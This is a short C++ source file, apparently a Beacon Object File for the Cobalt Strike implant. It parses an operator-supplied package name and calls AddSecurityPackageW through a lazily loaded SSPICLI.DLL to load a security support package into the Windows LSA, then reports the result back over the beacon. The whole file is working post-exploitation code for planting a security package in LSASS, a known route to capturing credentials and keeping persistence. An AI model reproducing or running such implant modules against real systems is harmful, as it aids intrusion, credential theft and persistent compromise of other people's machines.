// Copyright (C) 2025 Evan McBroom
#include "boflib.cpp"

extern "C" __declspec(dllexport) void go(PCHAR buffer, ULONG length) {
    BeaconData beaconData;
    BeaconDataParse(&beaconData, buffer, length);
    int packageNameSize;
    auto packageName = (wchar_t*)BeaconDataExtract(&beaconData, &packageNameSize);
    SECURITY_PACKAGE_OPTIONS options;
    options.Size = sizeof(options);
    options.Type = (BeaconDataLength(&beaconData) >= sizeof(int)) ? BeaconDataInt(&beaconData) : SECPKG_OPTIONS_TYPE_LSA;
    options.Flags = 0;
    options.SignatureSize = 0;
    options.Signature = nullptr;
    PIC_WSTRING(sspicli, L"SSPICLI.DLL");
    LAZY_LOAD_PROC(sspicli, AddSecurityPackageW);
    if (LazyAddSecurityPackageW(packageName, &options) == SEC_E_OK) {
        PIC_STRING(message, "Successfully added the security package.\n");
        BeaconPrintf(CallbackType::OUTPUT, message);
    } else {
        PIC_STRING(message, "Failed to add the security package.\n");
        BeaconPrintf(CallbackType::ERROR, message);
    }
}

